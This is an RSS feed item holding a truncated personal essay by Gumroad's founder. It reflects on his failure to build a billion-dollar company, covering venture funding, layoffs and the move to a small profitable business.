<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><label>Feb 7, 2019</label><h2>Reflecting on My Failure to Build a Billion-Dollar Company</h2><p>In 2011, I left my job as the second employee at Pinterest — before I vested any of my stock — to work on what I thought would be my life’s work.</p><blockquote><p lang="en" dir="ltr">Just had an idea for my first billion-dollar company. Tomorrow, I start building it.</p>— Sahil Lavingia (@shl) <a href="https://twitter.com/shl/status/54072049395712000?ref_src=twsrc%5Etfw">April 2, 2011</a></blockquote> <p>I thought Gumroad would become a billion-dollar company, with hundreds of employees. It would IPO, and I would work on it until I died. Something like that.</p><p>Needless to say, that didn’t happen.</p><p>Now, it may look like I am in an enviable position, running a profitable, growing, low-maintenance software business serving adoring customers. But for years, I considered myself a failure. At my lowest point, I had to lay off 75 percent of my company, including many of my best friends. I had failed.</p><p>It took me years to realize I was misguided from the outset. I no longer feel shame in the path I took to get to where I am today — but for a long time, I did. This is my journey, from the beginning.</p><h2>A weekend project turned VC-backed startup</h2><p>The idea behind Gumroad was simple: Creators and others should be able to sell their products directly to their audiences with quick, simple links. No need for a storefront.</p><p>I built Gumroad the weekend I thought up the idea, and launched it early Monday morning on Hacker News. The reaction exceeded my grandest aspirations. Over 52,000 people checked it out on the first day.</p><p>Later that year, I left my job as the second employee at Pinterest — before I vested any of my stock — to turn Gumroad into what I thought would become my life’s work.</p><p>Almost immediately, I raised $1.1M from an all-star cast of angel investors and venture capital firms, including Max Levchin, Chris Sacca, Ron Conway, Naval Ravikant, Collaborative Fund, Accel Partners, and First Round Capital. A few months later, in May 2012, we raised $7M more. Mike Abbott from Kleiner Perkins Caufield &amp; Byers (KPCB), a top-tier VC firm, led the round.</p><p>I was on top of the world. I was just 19, a solo founder, with over $8M in the bank and three employees. The world was starting to take note.</p><p>We grew the team. We stayed focused on our product. The monthly numbers started to climb. And then, at some point, they didn’t.</p><p>To keep the product alive, I laid off 75 percent of my company — including many of my best friends. It really sucked. But I told myself things would be fine: The product would continue to grow and no one far from the company would ever find out.</p><p>Then, TechCrunch got wind of the layoffs and published “Layoffs Hit Gumroad As The E-Commerce Startup Restructures.” All of a sudden, my failure was public. I spent the week ignoring my support network and answering our customers’ concerns, many of whom relied on us to power their businesses. They wanted to know if they should look for alternative products. Some of our favorite, most successful creators left. This hurt, but I don’t blame them for trying to minimize the risk in their own businesses.</p><p>So what exactly went wrong, and when?</p><h2>Failing in style</h2><p>Let’s start with the numbers. This is our monthly processed volume, until the layoffs:</p><p><img src="https://sahillavingia.com/0_z7tBf5i6wH-HbLhU.png"></p><p>It doesn’t look too bad, right? It’s going in the right direction: up.</p><p>But we were venture-funded, which was like playing a game of double-or-nothing. It’s euphoric when things are going your way — and suffocating when they’re not. And we weren’t doubling fast enough to raise the $15M+ Series B (the second major round of funding) we were looking for to grow the team.</p><p>For the type of business we were trying to build, every month of less than 20 percent growth should have been a red flag.</p><p>But at the time, I thought it was okay. We had money in the bank and product-market fit. We would continue to ship product and things would work out. The online creator movement was still nascent; the slow growth wasn’t our fault. It always looked like change was right around the corner.</p><p>But now, I realize: It doesn’t matter whose “fault” it is; we hit a peak in November 2014 and stalled. A lot of creators absolutely loved us, but there weren’t enough of them who needed our specific product offering. Product-market fit is great, but we needed to find a new, larger fit to justify raising more money (and then do it again and again, until acquisition or IPO).</p><p>In January 2015, after our final double-or-nothing hail-mary, our bank balance dipped below 18 months of runway. I told my 20-person team the road ahead would be a tough one. We didn’t have the numbers to raise a Series B, and we would have to work really hard over the next nine months to get even close. To that end, we deprioritized everything except features that would directly move the needle. Many were not core to our business, but we needed to try everything we could to get our monthly processed volume to where it needed to be.</p><p>If we succeeded, we would raise money from a top-tier VC again, hire more people, and pick up the journey where we’d left off. If we didn’t, we would have to drastically downsize the company.</p><p>In those nine months, when the whole team knew we were fighting for our company’s life, not a single person left Gumroad. From “this is gonna be hard,” to “yep, turns out it was,” every single person worked harder than ever.</p><p>We launched a “Small Product Lab” to teach new creators how to grow and sell. We shipped a ton of features, including weekly payouts, payouts to debit cards, payouts to the U.K., Australia, and Canada, various additions to our email features, product recommendations and search, analytics to see how customers are reading/watching/downloading the products they’ve purchased, and add-to-cart functionality. And that was just between August and November.</p><p>Unfortunately, we didn’t hit the numbers we needed.</p><h2>Slim down or shut down?</h2><p>Looking back, I’m glad we didn’t hit those numbers. If we’d doubled down, raised more money, and appeared in the headlines again, there would have been a very real possibility of even more spectacular failure.</p><p>With that off the table, our options were:</p><p>Shut down the business, return the remaining money to investors, and try something new.</p><p>Continue with a slimmed-down version of the company to aim for sustainability.</p><p>Position the company for an acquihire.</p><p>Some of my investors wanted me to shut down the business. They tried to convince me that my time was worth more than trying to keep a small business like Gumroad afloat, and I should try to build another billion-dollar company armed with all of my learnings — and their money.</p><p>I tended to agree with them, to be honest. But I was accountable to our creators, our employees, and our investors — in that order. We helped thousands of creators get paid, every month. About $2,500,000 was going to go into the pockets of creators — for rent checks and mortgages, for student loans and kids’ college funds. And it was only growing! Could I really just turn that faucet off?</p><p>If I sold the company, it would be mostly for our stellar team — and I would no longer be able to control the destiny of the product. There were too many acquisition stories of companies promising exciting journeys and amazing synergies to come — and ending with a deprecated product a year later.</p><p>Selling was certainly tempting. I could say I sold my first company, raise more money, and do this all again with a new idea. But that didn’t sit right with me. We were responsible to our creators first. That’s what I told every new hire and every investor. I didn’t want to become a serial entrepreneur and risk disappointing yet another customer base.</p><p>We decided to become profitable at any cost. The next year was not fun: I shrunk the company from twenty employees to five. We struggled to find a new tenant for our $25,000/month office. We focused all of our remaining resources on launching a premium service.</p><p>In June 2015, a few months before our layoffs, our financials looked like this:</p><ul><li>Revenue: $89,000 for the month</li><li>Gross profit: $17,000</li><li>Operating expenses: $364,000</li><li><strong>Net profit: -$351,000</strong></li></ul><p>A year later, in June 2016, our monthly numbers looked like this:</p><ul><li>Revenue: $176,000 for the month</li><li>Gross profit: $42,000</li><li>Operating expenses: $32,000</li><li><strong>Net profit: +$10,000</strong></li></ul><p>It hurt, but it meant creators would keep getting paid. It also meant that we were in control of our own destiny.</p><h2>From skeleton crew to lifestyle business</h2><p>It got worse from there.</p><p>Gumroad was no longer the venture-funded, fast-growing startup our investors and employees signed up for. As everyone else found other opportunities, the skeleton crew fizzled from five to one.</p><p>I was basically alone. I didn’t have a team, nor an office. And San Francisco was full of startups raising gobs of money, building amazing teams, and shipping great products. Some of my friends became billionaires. Meanwhile, I was running a “measly” lifestyle business. It wasn’t what I wanted to do, but I had to keep the ship from sinking.</p><p>Now, I understand some people would dream to be in that position. But at the time, I just felt trapped. I couldn’t stop, but there was only so much I could do as an army of one.</p><p>For years, my only metric of success was building a billion-dollar company. Now, I realize that was a terrible goal.</p><p>I shut off the rest of the world. I didn’t tell my mom about the layoffs — she had to read the article and tweets herself to find out. My friends were worried, but I assured them I was neither depressed nor suicidal. I left San Francisco for long stretches at a time, thinking that some travel would give me adequate distance. It only made me more lonely.</p><p>Every day, I woke up and took care of all of Gumroad’s support queries. I tried to fix all of the bugs I could. Often, I had to ask for help from former Gumroad engineers. They were all employed by then, but they always found time to help. Once all things Gumroad were taken care of, I tried to go to the gym, and if I had the willpower, work on a side project (a fantasy novel). Most days, I failed.</p><p>To me, happiness is about an expectation of positive change. Every year before 2016, there …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sahillavingia.com/reflecting">https://sahillavingia.com/reflecting</a></em></p>]]>
            </description>
            <link>https://sahillavingia.com/reflecting</link>
            <guid isPermaLink="false">hacker-news-small-sites-25964748</guid>
            <pubDate>Sat, 30 Jan 2021 00:38:19 GMT</pubDate>
        </item>
    </channel>
</rss>
